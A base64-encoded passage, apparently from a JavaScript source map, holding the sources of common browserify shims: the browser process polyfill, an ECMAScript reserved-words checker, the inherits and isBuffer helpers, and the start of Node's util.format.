IHNldFRpbWVvdXQpIHtcbiAgICAgICAgY2FjaGVkU2V0VGltZW91dCA9IHNldFRpbWVvdXQ7XG4gICAgICAgIHJldHVybiBzZXRUaW1lb3V0KGZ1biwgMCk7XG4gICAgfVxuICAgIHRyeSB7XG4gICAgICAgIC8vIHdoZW4gd2hlbiBzb21lYm9keSBoYXMgc2NyZXdlZCB3aXRoIHNldFRpbWVvdXQgYnV0IG5vIEkuRS4gbWFkZG5lc3NcbiAgICAgICAgcmV0dXJuIGNhY2hlZFNldFRpbWVvdXQoZnVuLCAwKTtcbiAgICB9IGNhdGNoKGUpe1xuICAgICAgICB0cnkge1xuICAgICAgICAgICAgLy8gV2hlbiB3ZSBhcmUgaW4gSS5FLiBidXQgdGhlIHNjcmlwdCBoYXMgYmVlbiBldmFsZWQgc28gSS5FLiBkb2Vzbid0IHRydXN0IHRoZSBnbG9iYWwgb2JqZWN0IHdoZW4gY2FsbGVkIG5vcm1hbGx5XG4gICAgICAgICAgICByZXR1cm4gY2FjaGVkU2V0VGltZW91dC5jYWxsKG51bGwsIGZ1biwgMCk7XG4gICAgICAgIH0gY2F0Y2goZSl7XG4gICAgICAgICAgICAvLyBzYW1lIGFzIGFib3ZlIGJ1dCB3aGVuIGl0J3MgYSB2ZXJzaW9uIG9mIEkuRS4gdGhhdCBtdXN0IGhhdmUgdGhlIGdsb2JhbCBvYmplY3QgZm9yICd0aGlzJywgaG9wZnVsbHkgb3VyIGNvbnRleHQgY29ycmVjdCBvdGhlcndpc2UgaXQgd2lsbCB0aHJvdyBhIGdsb2JhbCBlcnJvclxuICAgICAgICAgICAgcmV0dXJuIGNhY2hlZFNldFRpbWVvdXQuY2FsbCh0aGlzLCBmdW4sIDApO1xuICAgICAgICB9XG4gICAgfVxuXG5cbn1cbmZ1bmN0aW9uIHJ1bkNsZWFyVGltZW91dChtYXJrZXIpIHtcbiAgICBpZiAoY2FjaGVkQ2xlYXJUaW1lb3V0ID09PSBjbGVhclRpbWVvdXQpIHtcbiAgICAgICAgLy9ub3JtYWwgZW52aXJvbWVudHMgaW4gc2FuZSBzaXR1YXRpb25zXG4gICAgICAgIHJldHVybiBjbGVhclRpbWVvdXQobWFya2VyKTtcbiAgICB9XG4gICAgLy8gaWYgY2xlYXJUaW1lb3V0IHdhc24ndCBhdmFpbGFibGUgYnV0IHdhcyBsYXR0ZXIgZGVmaW5lZFxuICAgIGlmICgoY2FjaGVkQ2xlYXJUaW1lb3V0ID09PSBkZWZhdWx0Q2xlYXJUaW1lb3V0IHx8ICFjYWNoZWRDbGVhclRpbWVvdXQpICYmIGNsZWFyVGltZW91dCkge1xuICAgICAgICBjYWNoZWRDbGVhclRpbWVvdXQgPSBjbGVhclRpbWVvdXQ7XG4gICAgICAgIHJldHVybiBjbGVhclRpbWVvdXQobWFya2VyKTtcbiAgICB9XG4gICAgdHJ5IHtcbiAgICAgICAgLy8gd2hlbiB3aGVuIHNvbWVib2R5IGhhcyBzY3Jld2VkIHdpdGggc2V0VGltZW91dCBidXQgbm8gSS5FLiBtYWRkbmVzc1xuICAgICAgICByZXR1cm4gY2FjaGVkQ2xlYXJUaW1lb3V0KG1hcmtlcik7XG4gICAgfSBjYXRjaCAoZSl7XG4gICAgICAgIHRyeSB7XG4gICAgICAgICAgICAvLyBXaGVuIHdlIGFyZSBpbiBJLkUuIGJ1dCB0aGUgc2NyaXB0IGhhcyBiZWVuIGV2YWxlZCBzbyBJLkUuIGRvZXNuJ3QgIHRydXN0IHRoZSBnbG9iYWwgb2JqZWN0IHdoZW4gY2FsbGVkIG5vcm1hbGx5XG4gICAgICAgICAgICByZXR1cm4gY2FjaGVkQ2xlYXJUaW1lb3V0LmNhbGwobnVsbCwgbWFya2VyKTtcbiAgICAgICAgfSBjYXRjaCAoZSl7XG4gICAgICAgICAgICAvLyBzYW1lIGFzIGFib3ZlIGJ1dCB3aGVuIGl0J3MgYSB2ZXJzaW9uIG9mIEkuRS4gdGhhdCBtdXN0IGhhdmUgdGhlIGdsb2JhbCBvYmplY3QgZm9yICd0aGlzJywgaG9wZnVsbHkgb3VyIGNvbnRleHQgY29ycmVjdCBvdGhlcndpc2UgaXQgd2lsbCB0aHJvdyBhIGdsb2JhbCBlcnJvci5cbiAgICAgICAgICAgIC8vIFNvbWUgdmVyc2lvbnMgb2YgSS5FLiBoYXZlIGRpZmZlcmVudCBydWxlcyBmb3IgY2xlYXJUaW1lb3V0IHZzIHNldFRpbWVvdXRcbiAgICAgICAgICAgIHJldHVybiBjYWNoZWRDbGVhclRpbWVvdXQuY2FsbCh0aGlzLCBtYXJrZXIpO1xuICAgICAgICB9XG4gICAgfVxuXG5cblxufVxudmFyIHF1ZXVlID0gW107XG52YXIgZHJhaW5pbmcgPSBmYWxzZTtcbnZhciBjdXJyZW50UXVldWU7XG52YXIgcXVldWVJbmRleCA9IC0xO1xuXG5mdW5jdGlvbiBjbGVhblVwTmV4dFRpY2soKSB7XG4gICAgaWYgKCFkcmFpbmluZyB8fCAhY3VycmVudFF1ZXVlKSB7XG4gICAgICAgIHJldHVybjtcbiAgICB9XG4gICAgZHJhaW5pbmcgPSBmYWxzZTtcbiAgICBpZiAoY3VycmVudFF1ZXVlLmxlbmd0aCkge1xuICAgICAgICBxdWV1ZSA9IGN1cnJlbnRRdWV1ZS5jb25jYXQocXVldWUpO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHF1ZXVlSW5kZXggPSAtMTtcbiAgICB9XG4gICAgaWYgKHF1ZXVlLmxlbmd0aCkge1xuICAgICAgICBkcmFpblF1ZXVlKCk7XG4gICAgfVxufVxuXG5mdW5jdGlvbiBkcmFpblF1ZXVlKCkge1xuICAgIGlmIChkcmFpbmluZykge1xuICAgICAgICByZXR1cm47XG4gICAgfVxuICAgIHZhciB0aW1lb3V0ID0gcnVuVGltZW91dChjbGVhblVwTmV4dFRpY2spO1xuICAgIGRyYWluaW5nID0gdHJ1ZTtcblxuICAgIHZhciBsZW4gPSBxdWV1ZS5sZW5ndGg7XG4gICAgd2hpbGUobGVuKSB7XG4gICAgICAgIGN1cnJlbnRRdWV1ZSA9IHF1ZXVlO1xuICAgICAgICBxdWV1ZSA9IFtdO1xuICAgICAgICB3aGlsZSAoKytxdWV1ZUluZGV4IDwgbGVuKSB7XG4gICAgICAgICAgICBpZiAoY3VycmVudFF1ZXVlKSB7XG4gICAgICAgICAgICAgICAgY3VycmVudFF1ZXVlW3F1ZXVlSW5kZXhdLnJ1bigpO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIHF1ZXVlSW5kZXggPSAtMTtcbiAgICAgICAgbGVuID0gcXVldWUubGVuZ3RoO1xuICAgIH1cbiAgICBjdXJyZW50UXVldWUgPSBudWxsO1xuICAgIGRyYWluaW5nID0gZmFsc2U7XG4gICAgcnVuQ2xlYXJUaW1lb3V0KHRpbWVvdXQpO1xufVxuXG5wcm9jZXNzLm5leHRUaWNrID0gZnVuY3Rpb24gKGZ1bikge1xuICAgIHZhciBhcmdzID0gbmV3IEFycmF5KGFyZ3VtZW50cy5sZW5ndGggLSAxKTtcbiAgICBpZiAoYXJndW1lbnRzLmxlbmd0aCA+IDEpIHtcbiAgICAgICAgZm9yICh2YXIgaSA9IDE7IGkgPCBhcmd1bWVudHMubGVuZ3RoOyBpKyspIHtcbiAgICAgICAgICAgIGFyZ3NbaSAtIDFdID0gYXJndW1lbnRzW2ldO1xuICAgICAgICB9XG4gICAgfVxuICAgIHF1ZXVlLnB1c2gobmV3IEl0ZW0oZnVuLCBhcmdzKSk7XG4gICAgaWYgKHF1ZXVlLmxlbmd0aCA9PT0gMSAmJiAhZHJhaW5pbmcpIHtcbiAgICAgICAgcnVuVGltZW91dChkcmFpblF1ZXVlKTtcbiAgICB9XG59O1xuXG4vLyB2OCBsaWtlcyBwcmVkaWN0aWJsZSBvYmplY3RzXG5mdW5jdGlvbiBJdGVtKGZ1biwgYXJyYXkpIHtcbiAgICB0aGlzLmZ1biA9IGZ1bjtcbiAgICB0aGlzLmFycmF5ID0gYXJyYXk7XG59XG5JdGVtLnByb3RvdHlwZS5ydW4gPSBmdW5jdGlvbiAoKSB7XG4gICAgdGhpcy5mdW4uYXBwbHkobnVsbCwgdGhpcy5hcnJheSk7XG59O1xucHJvY2Vzcy50aXRsZSA9ICdicm93c2VyJztcbnByb2Nlc3MuYnJvd3NlciA9IHRydWU7XG5wcm9jZXNzLmVudiA9IHt9O1xucHJvY2Vzcy5hcmd2ID0gW107XG5wcm9jZXNzLnZlcnNpb24gPSAnJzsgLy8gZW1wdHkgc3RyaW5nIHRvIGF2b2lkIHJlZ2V4cCBpc3N1ZXNcbnByb2Nlc3MudmVyc2lvbnMgPSB7fTtcblxuZnVuY3Rpb24gbm9vcCgpIHt9XG5cbnByb2Nlc3Mub24gPSBub29wO1xucHJvY2Vzcy5hZGRMaXN0ZW5lciA9IG5vb3A7XG5wcm9jZXNzLm9uY2UgPSBub29wO1xucHJvY2Vzcy5vZmYgPSBub29wO1xucHJvY2Vzcy5yZW1vdmVMaXN0ZW5lciA9IG5vb3A7XG5wcm9jZXNzLnJlbW92ZUFsbExpc3RlbmVycyA9IG5vb3A7XG5wcm9jZXNzLmVtaXQgPSBub29wO1xucHJvY2Vzcy5wcmVwZW5kTGlzdGVuZXIgPSBub29wO1xucHJvY2Vzcy5wcmVwZW5kT25jZUxpc3RlbmVyID0gbm9vcDtcblxucHJvY2Vzcy5saXN0ZW5lcnMgPSBmdW5jdGlvbiAobmFtZSkgeyByZXR1cm4gW10gfVxuXG5wcm9jZXNzLmJpbmRpbmcgPSBmdW5jdGlvbiAobmFtZSkge1xuICAgIHRocm93IG5ldyBFcnJvcigncHJvY2Vzcy5iaW5kaW5nIGlzIG5vdCBzdXBwb3J0ZWQnKTtcbn07XG5cbnByb2Nlc3MuY3dkID0gZnVuY3Rpb24gKCkgeyByZXR1cm4gJy8nIH07XG5wcm9jZXNzLmNoZGlyID0gZnVuY3Rpb24gKGRpcikge1xuICAgIHRocm93IG5ldyBFcnJvcigncHJvY2Vzcy5jaGRpciBpcyBub3Qgc3VwcG9ydGVkJyk7XG59O1xucHJvY2Vzcy51bWFzayA9IGZ1bmN0aW9uKCkgeyByZXR1cm4gMDsgfTtcbiIsIm1vZHVsZS5leHBvcnRzID0gcmVxdWlyZSgnLi9yZXNlcnZlZC13b3JkcycpO1xuIiwidmFyIGFzc2VydCA9IHJlcXVpcmUoJ2Fzc2VydCcpO1xuXG4vKipcbiAqIFN0cnVjdHVyZSBmb3Igc3RvcmluZyBrZXl3b3Jkcy5cbiAqXG4gKiBAdHlwZWRlZiB7T2JqZWN0LjxTdHJpbmcsQm9vbGVhbj59IEtleXdvcmRzSGFzaFxuICovXG5cbi8qKlxuICogRUNNQVNjcmlwdCBkaWFsZWN0cy5cbiAqXG4gKiBAY29uc3RcbiAqIEB0eXBlIHtPYmplY3QuPFN0cmluZyxOdW1iZXJ8U3RyaW5nPn0gLSBrZXlzIGFzIHJlYWRhYmxlIG5hbWVzIGFuZCB2YWx1ZXMgYXMgdmVyc2lvbnNcbiAqL1xudmFyIERJQUxFQ1RTID0ge1xuICAgIGVzMzogMyxcbiAgICBlczU6IDUsXG4gICAgZXMyMDE1OiA2LFxuICAgIGVzNzogNyxcblxuICAgIC8vIGFsaWFzZXNcbiAgICBlczY6IDYsXG4gICAgJ2RlZmF1bHQnOiA1LFxuICAgIG5leHQ6IDZcbn07XG5cbi8qKlxuICogRUNNQVNjcmlwdCByZXNlcnZlZCB3b3Jkcy5cbiAqXG4gKiBAdHlwZSB7T2JqZWN0LjxTdHJpbmcsS2V5d29yZHNIYXNoPn1cbiAqL1xudmFyIEtFWVdPUkRTID0gZXhwb3J0cy5LRVlXT1JEUyA9IHt9O1xuXG4vKipcbiAqIENoZWNrIHdvcmQgZm9yIGJlaW5nIGFuIHJlc2VydmVkIHdvcmQuXG4gKlxuICogQHBhcmFtIHtTdHJpbmd9IHdvcmQgLSB3b3JkIHRvIGNoZWNrXG4gKiBAcGFyYW0ge1N0cmluZ3xOdW1iZXJ9IFtkaWFsZWN0XSAtIGRpYWxlY3Qgb3IgdmVyc2lvblxuICogQHBhcmFtIHtCb29sZWFufSBbc3RyaWN0XSAtIHN0cmljdCBtb2RlXG4gKiBAcmV0dXJucyB7P0Jvb2xlYW59XG4gKi9cbmV4cG9ydHMuY2hlY2sgPSBmdW5jdGlvbiBjaGVjayh3b3JkLCBkaWFsZWN0LCBzdHJpY3QpIHtcbiAgICBkaWFsZWN0ID0gZGlhbGVjdCB8fCBESUFMRUNUUy5kZWZhdWx0O1xuICAgIHZhciB2ZXJzaW9uID0gRElBTEVDVFNbZGlhbGVjdF0gfHwgZGlhbGVjdDtcblxuICAgIGlmIChzdHJpY3QgJiYgdmVyc2lvbiA+PSA1KSB7XG4gICAgICAgIHZlcnNpb24gKz0gJy1zdHJpY3QnO1xuICAgIH1cblxuICAgIGFzc2VydChLRVlXT1JEU1t2ZXJzaW9uXSwgJ1Vua25vd24gZGlhbGVjdCcpO1xuXG4gICAgcmV0dXJuIEtFWVdPUkRTW3ZlcnNpb25dLmhhc093blByb3BlcnR5KHdvcmQpO1xufTtcblxuLyoqXG4gKiBSZXNlcnZlZCBXb3JkcyBmb3IgRVMzXG4gKlxuICogRUNNQS0yNjIgM3JkOiA3LjUuMVxuICogaHR0cDovL3d3dy5lY21hLWludGVybmF0aW9uYWwub3JnL3B1YmxpY2F0aW9ucy9maWxlcy9FQ01BLVNULUFSQ0gvRUNNQS0yNjIsJTIwM3JkJTIwZWRpdGlvbiwlMjBEZWNlbWJlciUyMDE5OTkucGRmXG4gKlxuICogQHR5cGUge0tleXdvcmRzSGFzaH1cbiAqL1xuS0VZV09SRFNbJzMnXSA9IF9oYXNoKFxuICAgIC8vIEtleXdvcmQsIEVDTUEtMjYyIDNyZDogNy41LjJcbiAgICAnYnJlYWsgICAgZWxzZSAgICAgICBuZXcgICAgIHZhcicsXG4gICAgJ2Nhc2UgICAgIGZpbmFsbHkgICAgcmV0dXJuICB2b2lkJyxcbiAgICAnY2F0Y2ggICAgZm9yICAgICAgICBzd2l0Y2ggIHdoaWxlJyxcbiAgICAnY29udGludWUgZnVuY3Rpb24gICB0aGlzICAgIHdpdGgnLFxuICAgICdkZWZhdWx0ICBpZiAgICAgICAgIHRocm93JyxcbiAgICAnZGVsZXRlICAgaW4gICAgICAgICB0cnknLFxuICAgICdkbyAgICAgICBpbnN0YW5jZW9mIHR5cGVvZicsXG4gICAgLy8gRnV0dXJlUmVzZXJ2ZWRXb3JkLCBFQ01BLTI2MiAzcmQgNy41LjNcbiAgICAnYWJzdHJhY3QgZW51bSAgICAgICBpbnQgICAgICAgIHNob3J0JyxcbiAgICAnYm9vbGVhbiAgZXhwb3J0ICAgICBpbnRlcmZhY2UgIHN0YXRpYycsXG4gICAgJ2J5dGUgICAgIGV4dGVuZHMgICAgbG9uZyAgICAgICBzdXBlcicsXG4gICAgJ2NoYXIgICAgIGZpbmFsICAgICAgbmF0aXZlICAgICBzeW5jaHJvbml6ZWQnLFxuICAgICdjbGFzcyAgICBmbG9hdCAgICAgIHBhY2thZ2UgICAgdGhyb3dzJyxcbiAgICAnY29uc3QgICAgZ290byAgICAgICBwcml2YXRlICAgIHRyYW5zaWVudCcsXG4gICAgJ2RlYnVnZ2VyIGltcGxlbWVudHMgcHJvdGVjdGVkICB2b2xhdGlsZScsXG4gICAgJ2RvdWJsZSAgIGltcG9ydCAgICAgcHVibGljJyxcbiAgICAvLyBOdWxsTGl0ZXJhbCAmIEJvb2xlYW5MaXRlcmFsXG4gICAgJ251bGwgdHJ1ZSBmYWxzZSdcbik7XG5cbi8qKlxuICogUmVzZXJ2ZWQgV29yZHMgZm9yIEVTNS5cbiAqXG4gKiBodHRwOi8vZXM1LmdpdGh1Yi5pby8jeDcuNi4xXG4gKlxuICogQHR5cGUge0tleXdvcmRzSGFzaH1cbiAqL1xuS0VZV09SRFNbJzUnXSA9IF9oYXNoKFxuICAgIC8vIEtleXdvcmRcbiAgICAnYnJlYWsgICAgZG8gICAgICAgaW5zdGFuY2VvZiB0eXBlb2YnLFxuICAgICdjYXNlICAgICBlbHNlICAgICBuZXcgICAgICAgIHZhcicsXG4gICAgJ2NhdGNoICAgIGZpbmFsbHkgIHJldHVybiAgICAgdm9pZCcsXG4gICAgJ2NvbnRpbnVlIGZvciAgICAgIHN3aXRjaCAgICAgd2hpbGUnLFxuICAgICdkZWJ1Z2dlciBmdW5jdGlvbiB0aGlzICAgICAgIHdpdGgnLFxuICAgICdkZWZhdWx0ICBpZiAgICAgICB0aHJvdycsXG4gICAgJ2RlbGV0ZSAgIGluICAgICAgIHRyeScsXG4gICAgLy8gRnV0dXJlUmVzZXJ2ZWRXb3JkXG4gICAgJ2NsYXNzIGVudW0gZXh0ZW5kcyBzdXBlcicsXG4gICAgJ2NvbnN0IGV4cG9ydCBpbXBvcnQnLFxuICAgIC8vIE51bGxMaXRlcmFsICYgQm9vbGVhbkxpdGVyYWxcbiAgICAnbnVsbCB0cnVlIGZhbHNlJ1xuKTtcblxuLyoqXG4gKiBSZXNlcnZlZCBXb3JkcyBmb3IgRVM1IGluIHN0cmljdCBtb2RlLlxuICpcbiAqIEB0eXBlIHtLZXl3b3Jkc0hhc2h9XG4gKi9cbktFWVdPUkRTWyc1LXN0cmljdCddID0gX2hhc2goXG4gICAgS0VZV09SRFNbJzUnXSxcbiAgICAvLyBGdXR1cmVSZXNlcnZlZFdvcmQsIHN0cmljdCBtb2RlLiBodHRwOi8vZXM1LmdpdGh1Yi5pby8jeDcuNi4xLjJcbiAgICAnaW1wbGVtZW50cyBsZXQgICAgIHByaXZhdGUgICBwdWJsaWMgeWllbGQnLFxuICAgICdpbnRlcmZhY2UgIHBhY2thZ2UgcHJvdGVjdGVkIHN0YXRpYydcbik7XG5cbi8qKlxuICogUmVzZXJ2ZWQgV29yZHMgZm9yIEVTNi5cbiAqXG4gKiAxMS42LjJcbiAqIGh0dHA6Ly93d3cuZWNtYS1pbnRlcm5hdGlvbmFsLm9yZy9lY21hLTI2Mi82LjAvaW5kZXguaHRtbCNzZWMtcmVzZXJ2ZWQtd29yZHNcbiAqXG4gKiBAdHlwZSB7S2V5d29yZHNIYXNofVxuICovXG5LRVlXT1JEU1snNiddID0gX2hhc2goXG4gICAgLy8gS2V5d29yZHMsIEVTNiAxMS42LjIuMSwgaHR0cDovL3d3dy5lY21hLWludGVybmF0aW9uYWwub3JnL2VjbWEtMjYyLzYuMC9pbmRleC5odG1sI3NlYy1rZXl3b3Jkc1xuICAgICdicmVhayAgICBkbyAgICAgICBpbiAgICAgICAgIHR5cGVvZicsXG4gICAgJ2Nhc2UgICAgIGVsc2UgICAgIGluc3RhbmNlb2YgdmFyJyxcbiAgICAnY2F0Y2ggICAgZXhwb3J0ICAgbmV3ICAgICAgICB2b2lkJyxcbiAgICAnY2xhc3MgICAgZXh0ZW5kcyAgcmV0dXJuICAgICB3aGlsZScsXG4gICAgJ2NvbnN0ICAgIGZpbmFsbHkgIHN1cGVyICAgICAgd2l0aCcsXG4gICAgJ2NvbnRpbnVlIGZvciAgICAgIHN3aXRjaCAgICAgeWllbGQnLFxuICAgICdkZWJ1Z2dlciBmdW5jdGlvbiB0aGlzJyxcbiAgICAnZGVmYXVsdCAgaWYgICAgICAgdGhyb3cnLFxuICAgICdkZWxldGUgICBpbXBvcnQgICB0cnknLFxuICAgIC8vIEZ1dHVyZSBSZXNlcnZlZCBXb3JkcywgRVM2IDExLjYuMi4yXG4gICAgLy8gaHR0cDovL3d3dy5lY21hLWludGVybmF0aW9uYWwub3JnL2VjbWEtMjYyLzYuMC9pbmRleC5odG1sI3NlYy1mdXR1cmUtcmVzZXJ2ZWQtd29yZHNcbiAgICAnZW51bSBhd2FpdCcsXG4gICAgLy8gTnVsbExpdGVyYWwgJiBCb29sZWFuTGl0ZXJhbFxuICAgICdudWxsIHRydWUgZmFsc2UnXG4pO1xuXG4vKipcbiAqIFJlc2VydmVkIFdvcmRzIGZvciBFUzYgaW4gc3RyaWN0IG1vZGUuXG4gKlxuICogQHR5cGUge0tleXdvcmRzSGFzaH1cbiAqL1xuS0VZV09SRFNbJzYtc3RyaWN0J10gPSBfaGFzaChcbiAgICBLRVlXT1JEU1snNiddLFxuICAgIC8vIEtleXdvcmRzLCBFUzYgMTEuNi4yLjFcbiAgICAnbGV0IHN0YXRpYycsXG4gICAgLy8gRnV0dXJlIFJlc2VydmVkIFdvcmRzLCBFUzYgMTEuNi4yLjJcbiAgICAnaW1wbGVtZW50cyBwYWNrYWdlIHByb3RlY3RlZCcsXG4gICAgJ2ludGVyZmFjZSBwcml2YXRlIHB1YmxpYydcbik7XG5cbi8qKlxuICogR2VuZXJhdGVzIGhhc2ggZnJvbSBzdHJpbmdzXG4gKlxuICogQHByaXZhdGVcbiAqIEBwYXJhbSB7Li4uU3RyaW5nfEtleXdvcmRzSGFzaH0ga2V5d29yZHMgLSBTcGFjZS1kZWxpbWl0ZWQgc3RyaW5nIG9yIHByZXZpb3VzIHJlc3VsdCBvZiBfaGFzaFxuICogQHJldHVybiB7S2V5d29yZHNIYXNofSAtIE9iamVjdCB3aXRoIGtleXdvcmRzIGluIGtleXMgYW5kIHRydWUgaW4gdmFsdWVzXG4gKi9cbmZ1bmN0aW9uIF9oYXNoKCkge1xuICAgIHZhciBzZXQgPSBBcnJheS5wcm90b3R5cGUubWFwLmNhbGwoYXJndW1lbnRzLCBmdW5jdGlvbih2KSB7XG4gICAgICAgIHJldHVybiB0eXBlb2YgdiA9PT0gJ3N0cmluZycgPyB2IDogT2JqZWN0LmtleXModikuam9pbignICcpO1xuICAgIH0pLmpvaW4oJyAnKTtcblxuICAgIHJldHVybiBzZXQuc3BsaXQoL1xccysvKVxuICAgICAgICAucmVkdWNlKGZ1bmN0aW9uKHJlcywga2V5d29yZCkge1xuICAgICAgICAgICAgcmVzW2tleXdvcmRdID0gdHJ1ZTtcbiAgICAgICAgICAgIHJldHVybiByZXM7XG4gICAgICAgIH0sIHt9KTtcbn1cbiIsImlmICh0eXBlb2YgT2JqZWN0LmNyZWF0ZSA9PT0gJ2Z1bmN0aW9uJykge1xuICAvLyBpbXBsZW1lbnRhdGlvbiBmcm9tIHN0YW5kYXJkIG5vZGUuanMgJ3V0aWwnIG1vZHVsZVxuICBtb2R1bGUuZXhwb3J0cyA9IGZ1bmN0aW9uIGluaGVyaXRzKGN0b3IsIHN1cGVyQ3Rvcikge1xuICAgIGN0b3Iuc3VwZXJfID0gc3VwZXJDdG9yXG4gICAgY3Rvci5wcm90b3R5cGUgPSBPYmplY3QuY3JlYXRlKHN1cGVyQ3Rvci5wcm90b3R5cGUsIHtcbiAgICAgIGNvbnN0cnVjdG9yOiB7XG4gICAgICAgIHZhbHVlOiBjdG9yLFxuICAgICAgICBlbnVtZXJhYmxlOiBmYWxzZSxcbiAgICAgICAgd3JpdGFibGU6IHRydWUsXG4gICAgICAgIGNvbmZpZ3VyYWJsZTogdHJ1ZVxuICAgICAgfVxuICAgIH0pO1xuICB9O1xufSBlbHNlIHtcbiAgLy8gb2xkIHNjaG9vbCBzaGltIGZvciBvbGQgYnJvd3NlcnNcbiAgbW9kdWxlLmV4cG9ydHMgPSBmdW5jdGlvbiBpbmhlcml0cyhjdG9yLCBzdXBlckN0b3IpIHtcbiAgICBjdG9yLnN1cGVyXyA9IHN1cGVyQ3RvclxuICAgIHZhciBUZW1wQ3RvciA9IGZ1bmN0aW9uICgpIHt9XG4gICAgVGVtcEN0b3IucHJvdG90eXBlID0gc3VwZXJDdG9yLnByb3RvdHlwZVxuICAgIGN0b3IucHJvdG90eXBlID0gbmV3IFRlbXBDdG9yKClcbiAgICBjdG9yLnByb3RvdHlwZS5jb25zdHJ1Y3RvciA9IGN0b3JcbiAgfVxufVxuIiwibW9kdWxlLmV4cG9ydHMgPSBmdW5jdGlvbiBpc0J1ZmZlcihhcmcpIHtcbiAgcmV0dXJuIGFyZyAmJiB0eXBlb2YgYXJnID09PSAnb2JqZWN0J1xuICAgICYmIHR5cGVvZiBhcmcuY29weSA9PT0gJ2Z1bmN0aW9uJ1xuICAgICYmIHR5cGVvZiBhcmcuZmlsbCA9PT0gJ2Z1bmN0aW9uJ1xuICAgICYmIHR5cGVvZiBhcmcucmVhZFVJbnQ4ID09PSAnZnVuY3Rpb24nO1xufSIsIi8vIENvcHlyaWdodCBKb3llbnQsIEluYy4gYW5kIG90aGVyIE5vZGUgY29udHJpYnV0b3JzLlxuLy9cbi8vIFBlcm1pc3Npb24gaXMgaGVyZWJ5IGdyYW50ZWQsIGZyZWUgb2YgY2hhcmdlLCB0byBhbnkgcGVyc29uIG9idGFpbmluZyBhXG4vLyBjb3B5IG9mIHRoaXMgc29mdHdhcmUgYW5kIGFzc29jaWF0ZWQgZG9jdW1lbnRhdGlvbiBmaWxlcyAodGhlXG4vLyBcIlNvZnR3YXJlXCIpLCB0byBkZWFsIGluIHRoZSBTb2Z0d2FyZSB3aXRob3V0IHJlc3RyaWN0aW9uLCBpbmNsdWRpbmdcbi8vIHdpdGhvdXQgbGltaXRhdGlvbiB0aGUgcmlnaHRzIHRvIHVzZSwgY29weSwgbW9kaWZ5LCBtZXJnZSwgcHVibGlzaCxcbi8vIGRpc3RyaWJ1dGUsIHN1YmxpY2Vuc2UsIGFuZC9vciBzZWxsIGNvcGllcyBvZiB0aGUgU29mdHdhcmUsIGFuZCB0byBwZXJtaXRcbi8vIHBlcnNvbnMgdG8gd2hvbSB0aGUgU29mdHdhcmUgaXMgZnVybmlzaGVkIHRvIGRvIHNvLCBzdWJqZWN0IHRvIHRoZVxuLy8gZm9sbG93aW5nIGNvbmRpdGlvbnM6XG4vL1xuLy8gVGhlIGFib3ZlIGNvcHlyaWdodCBub3RpY2UgYW5kIHRoaXMgcGVybWlzc2lvbiBub3RpY2Ugc2hhbGwgYmUgaW5jbHVkZWRcbi8vIGluIGFsbCBjb3BpZXMgb3Igc3Vic3RhbnRpYWwgcG9ydGlvbnMgb2YgdGhlIFNvZnR3YXJlLlxuLy9cbi8vIFRIRSBTT0ZUV0FSRSBJUyBQUk9WSURFRCBcIkFTIElTXCIsIFdJVEhPVVQgV0FSUkFOVFkgT0YgQU5ZIEtJTkQsIEVYUFJFU1Ncbi8vIE9SIElNUExJRUQsIElOQ0xVRElORyBCVVQgTk9UIExJTUlURUQgVE8gVEhFIFdBUlJBTlRJRVMgT0Zcbi8vIE1FUkNIQU5UQUJJTElUWSwgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UgQU5EIE5PTklORlJJTkdFTUVOVC4gSU5cbi8vIE5PIEVWRU5UIFNIQUxMIFRIRSBBVVRIT1JTIE9SIENPUFlSSUdIVCBIT0xERVJTIEJFIExJQUJMRSBGT1IgQU5ZIENMQUlNLFxuLy8gREFNQUdFUyBPUiBPVEhFUiBMSUFCSUxJVFksIFdIRVRIRVIgSU4gQU4gQUNUSU9OIE9GIENPTlRSQUNULCBUT1JUIE9SXG4vLyBPVEhFUldJU0UsIEFSSVNJTkcgRlJPTSwgT1VUIE9GIE9SIElOIENPTk5FQ1RJT04gV0lUSCBUSEUgU09GVFdBUkUgT1IgVEhFXG4vLyBVU0UgT1IgT1RIRVIgREVBTElOR1MgSU4gVEhFIFNPRlRXQVJFLlxuXG52YXIgZm9ybWF0UmVnRXhwID0gLyVbc2RqJV0vZztcbmV4cG9ydHMuZm9ybWF0ID0gZnVuY3Rpb24oZikge1xuICBpZiAoIWlzU3RyaW5nKGYpKSB7XG4gICAgdmFyIG9iamVjdHMgPSBbXTtcbiAgICBmb3IgKHZhciBpID0gMDsgaSA8IGFyZ3VtZW50cy5sZW5ndGg7IGkrKykge1xuICAgICAgb2JqZWN0cy5wdXNoKGluc3BlY3QoYXJndW1lbnRzW2ldKSk7XG4gICAgfVxuICAgIHJldHVybiBvYmplY3RzLmpvaW4oJyAnKTtcbiAgfVxuXG4gIHZhciBpID0gMTtcbiAgdmFyIGFyZ3MgPSBhcmd1bWVudHM7XG4gIHZhciBsZW4gPSBhcmdzLmxlbmd0aDtcbiAgdmFyIHN0ciA9IFN0cmluZyhmKS5yZXBsYWNlKGZvcm1hdFJlZ0V4cCwgZnVuY3Rpb24oeCkge1xuICAgIGlmICh4ID09PSAnJSUnKSByZXR1cm4gJyUnO1xuICAgIGlmIChpID49IGxlbikgcmV0dXJuIHg7XG4gICAgc3dpdGNoICh4KSB7XG4gICAgICBjYXNlICclcyc6IHJldHVybiBTdHJpbmcoYXJnc1tpKytdKTtcbiAgICAgIGNhc2UgJyVkJzogcmV0dXJuIE51bWJlcihhcmdzW2krK10pO1xuICAgICAgY2FzZSAnJWonOlxuICAgICAgICB0cnkge1xuICAgICAgICAgIHJldHVybiBKU09OLnN0cmluZ2lmeShhcmdzW2krK10pO1xuICAgICAgICB9IGNhdGNoIChfKSB7XG4gICAgICAgICAgcmV0dXJuICdbQ2lyY3VsYXJdJztcbiAgICAgICAgfVxuICAgICAgZGVmYXVsdDpcbiAgICAgICAgcmV0dXJuIHg7XG4gICAgfVxuICB9KTtcbiAgZm9yICh2YXIgeCA9IGFyZ3NbaV07IGkgPCBsZW47IHggPSBhcmdzWysraV0pIHtcbiAgICBpZiAoaXNOdWxsKHgpIHx8ICFpc09iamVjdCh4KSkge1xuICAgICAgc3RyICs9ICcgJyArIHg7XG4gICAgfSBlbHNlIHtcbiAgICAgIHN0ciArPSAnICcgKyBpbnNwZWN0KHgpO1xuICAgIH1cbiAgfVxuICByZXR1cm4gc3RyO1xufTtcblxuXG4vLyBNYXJrIHRoYXQgYSBtZXRob2Qgc2hvdWxkIG5vdCB